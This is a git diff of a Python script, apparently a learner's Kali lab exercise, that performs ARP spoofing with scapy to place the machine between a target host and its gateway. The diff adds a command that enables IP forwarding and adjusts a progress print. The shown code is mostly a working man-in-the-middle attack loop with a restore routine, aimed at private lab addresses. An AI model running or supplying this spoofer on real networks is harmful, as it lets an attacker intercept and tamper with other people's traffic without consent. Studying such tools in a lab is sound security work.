@@ -1,6 +1,7 @@
 # spoofer : gia mao
 # man in the middle.
 # sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'  allow packet throw kali machine
+import os
 import sys
 import time
 
@@ -41,6 +42,7 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, count=4, verbose=False)
 
 
+os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 target_ip = "192.168.88.129"
 gateway_ip = "192.168.88.2"
 sent_packets_count = 0
@@ -49,12 +51,10 @@ try:
         spoofer(target_ip, gateway_ip)
         spoofer(gateway_ip, target_ip)
         sent_packets_count = sent_packets_count + 2
-        print("\r[+] Sent two packet: " + str(sent_packets_count), end="")
+        print("\r[+] Sent two packet: " + str(sent_packets_count))
         # sys.stdout.flush()
         time.sleep(2)  # wait 2 seconds
 except KeyboardInterrupt:
     print("\n[-] Detected CTRL + C ..... Quitting.")
     restore(target_ip, gateway_ip)
     restore(gateway_ip, target_ip)
-
-
